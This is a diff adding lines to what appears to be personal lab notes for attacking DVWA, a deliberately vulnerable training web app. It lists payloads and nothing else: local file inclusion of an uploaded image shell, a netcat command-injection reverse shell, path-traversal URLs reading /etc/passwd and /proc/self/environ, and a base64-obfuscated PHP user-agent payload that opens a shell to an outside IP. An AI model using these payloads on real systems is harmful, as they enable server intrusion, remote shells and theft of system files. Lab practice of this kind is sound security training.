@@ -17,3 +17,10 @@ Additonal tools:
 5.Accessing image shell bypass at dvwa low level security using LFI vulnerability: http://localhost/dvwa/vulnerabilities/fi/?page=/var/www/html/dvwa/hackable/uploads/admin.png
 										   or http://localhost/dvwa/vulnerabilities/fi/?page=http://localhost/dvwa/hackable/uploads/admin.png
 6.Command injection medium payload for reverse shell localhost|nc -e /bin/sh localhost 8888 (listen using nc -lvnp 8888).
+7.File injection: http://localhost/DVWA/vulnerabilities/fi/?page=/../../../../../../etc/passwd, or /etc/passwd
+		  http://localhost/DVWA/vulnerabilities/fi/?page=/../../../../../../proc/version, or /proc/version
+		  http://localhost/DVWA/vulnerabilities/fi/?page=/../../../../../log/auth.log or /proc/self/environ or /log/apache2/access.log(not working)
+		  burpsuite user agent payload: <?passthru(base64_decode('c2ggLWkgPiYgL2Rldi90Y3AvMTAuNy40MC40NS85MDAxIDA+JjE='));?>
+		  
+		  
+		  
